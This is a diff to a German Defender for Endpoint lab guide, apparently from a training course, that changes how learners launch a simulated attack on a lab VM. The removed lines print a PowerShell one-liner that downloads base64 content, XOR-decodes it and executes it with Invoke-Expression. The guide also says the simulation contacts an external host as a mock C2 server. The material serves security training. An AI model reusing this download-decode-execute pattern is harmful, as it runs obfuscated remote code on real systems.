@@ -78,23 +78,13 @@ In dieser Aufgabe untersuchen Sie die Warnungen und Vorfälle, die vom Onboardin
 
 >**Warnung:** Dieser simulierte Angriff ist eine hervorragende praktische Lernquelle. Führen Sie den Angriff aus den Anweisungen für diese Übung nur aus, wenn Sie den für den Kurs bereitgestellten Azure-Mandanten verwenden.  Sie können andere simulierte Angriffe für diesen Mandanten durchführen, *nachdem* dieser Schulungskurs abgeschlossen wurde.
 
-In dieser Aufgabe simulieren Sie einen Angriff auf die WIN1-VM und überprüfen, ob der Angriff von Microsoft Defender for Endpoint erkannt und abgewehrt wird.
+In dieser Aufgabe simulieren Sie einen Angriff auf die WIN1-VM (durch Ausführen eines PowerShell-Skripts) und überprüfen, ob der Angriff von Microsoft Defender for Endpoint erkannt und abgewehrt wird.
 
-1. Klicken Sie auf der WIN1-VM *mit der rechten Maustaste* auf die Schaltfläche **Start**, und wählen Sie **Windows PowerShell (Administrator)** aus.
+1. Geben Sie auf der virtuellen Maschine WIN1 **PowerShell** in die Suchleiste ein und *klicken Sie dann mit der rechten Maustaste auf* **Windows PowerShell** und wählen Sie die Option *Als Administrator ausführen* aus.
 
 1. Wenn das Fenster „Benutzerkontensteuerung“ angezeigt wird, wählen Sie **Ja**, um die App auszuführen.
 
-1. Kopieren Sie das folgende Simulationsskript, und fügen Sie es in das PowerShell-Fenster ein. Drücken Sie anschließend die **Eingabetaste**, um es auszuführen:
-
-    ```PowerShell
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    ```
-
-    >**Hinweis:** Wenn beim Ausführen des Skripts Fehler (rot) auftreten, können Sie die Editor-App öffnen und das Skript in eine leere Datei kopieren. Stellen Sie sicher, dass *Zeilenumbruch* im Editor aktiviert ist. Kopieren Sie dann jede Zeile des Skripts separat in PowerShell, und führen Sie sie aus. Außerdem wurde ein PowerShell-Skript (attacksim.ps1) in den Dateien bereitgestellt, die am Anfang der Labore heruntergeladen wurden. Navigieren Sie zur Verwendung des Skripts in **Windows PowerShell (Administrator)** zum Ordner *\Users\Admin\Desktop\Allfiles*, geben Sie *.\attacksim.ps1* ein, und drücken Sie die **EINGABETASTE**, um es auszuführen.
+1. Navigieren Sie zur Verwendung des Skripts in **Windows PowerShell (Administrator)** zum Ordner *\Users\Admin\Desktop\Allfiles*, geben Sie *.\AttackScript.ps1* ein, und drücken Sie die **EINGABETASTE**, um es auszuführen. Geben Sie als Nächstes **R** ein, und drücken Sie die **EINGABETASTE**, um es *einmal auszuführen*.
 
 1. Das Skript erzeugt eine Ausgabe mit mehreren Zeilen und die Meldung, dass *Domänencontroller in der Domäne nicht aufgelöst werden konnten*. Ein paar Sekunden später wird die *Editor*-App geöffnet. Ein simulierter Angriffscode wird im Editor eingefügt. Lassen Sie die automatisch generierte Editor-Instanz geöffnet, um das vollständige Szenario zu erleben. Der simulierte Angriffscode versucht, mit einer externen IP-Adresse zu kommunizieren (simuliert einen C2-Server).
 
